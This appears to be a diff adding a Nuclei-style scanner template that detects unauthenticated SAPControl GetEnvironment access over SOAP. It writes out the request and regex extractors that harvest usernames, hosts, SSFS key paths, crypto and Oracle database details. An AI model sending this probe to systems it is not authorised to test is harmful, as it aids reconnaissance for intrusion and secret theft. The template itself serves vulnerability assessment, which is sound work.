@@ -1,0 +1,90 @@
+id: sap-sapcontrol-getenvironment-env-disclosure
+
+info:
+  name: SAPControl - GetEnvironment without authentication
+  author: LRVT <https://github.com/l4rm4nd>
+  severity: medium
+  tags: sap,sapcontrol,soap,env,info-disclosure
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}"
+
+    headers:
+      Content-Type: text/xml; charset=UTF-8
+      SOAPAction: '""'
+      User-Agent: Mozilla/5.0
+
+    body: |
+      <?xml version="1.0" encoding="utf-8"?>
+      <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
+        <SOAP-ENV:Header>
+          <sapsess:Session xmlns:sapsess="http://www.sap.com/webas/630/soap/features/session/">
+            <enableSession>true</enableSession>
+          </sapsess:Session>
+        </SOAP-ENV:Header>
+        <SOAP-ENV:Body>
+          <ns1:GetEnvironment xmlns:ns1="urn:SAPControl"/>
+        </SOAP-ENV:Body>
+      </SOAP-ENV:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "GetEnvironmentResponse"
+
+      - type: word
+        part: body
+        words:
+          - "HOME=/home/"
+          - "LOGNAME="
+          - "USER="
+        condition: or
+
+    extractors:
+      # generic useful stuff (user enumeration / host info)
+      - type: regex
+        part: body
+        name: env_lines
+        group: 1
+        regex:
+          - "<item>(LOGNAME=[^<]+)</item>"
+          - "<item>(HOME=[^<]+)</item>"
+          - "<item>(USER=[^<]+)</item>"
+          - "<item>(HOSTNAME=[^<]+)</item>"
+          - "<item>(HOST=[^<]+)</item>"
+
+          # SAP / kernel paths
+          - "<item>(SAPSYSTEMNAME=[^<]+)</item>"
+          - "<item>(DIR_LIBRARY=[^<]+)</item>"
+          - "<item>(LD_LIBRARY_PATH=[^<]+)</item>"
+          - "<item>(SAPEXE=[^<]+)</item>"
+
+          # SSFS / crypto
+          - "<item>(RSEC_SSFS_DATAPATH=[^<]+)</item>"
+          - "<item>(RSEC_SSFS_KEYPATH=[^<]+)</item>"
+          - "<item>(SNC_LIB=[^<]+)</item>"
+          - "<item>(SECUDIR=[^<]+)</item>"
+
+          # DB / Oracle relevant
+          - "<item>(DB_SID=[^<]+)</item>"
+          - "<item>(dbms_type=[^<]+)</item>"
+          - "<item>(dbs_ora_tnsname=[^<]+)</item>"
+          - "<item>(ORACLE_SID=[^<]+)</item>"
+          - "<item>(ORACLE_BASE=[^<]+)</item>"
+          - "<item>(TNS_ADMIN=[^<]+)</item>"
+          - "<item>(NLS_LANG=[^<]+)</item>"
+          - "<item>(SAPDATA_HOME=[^<]+)</item>"
+
+          # misc SID / alias
+          - "<item>(sid=[^<]+)</item>"
+          - "<item>(aliasname=[^<]+)</item>"
+          - "<item>(CPU=[^<]+)</item>"
+          - "<item>(MACHTYPE=[^<]+)</item>"
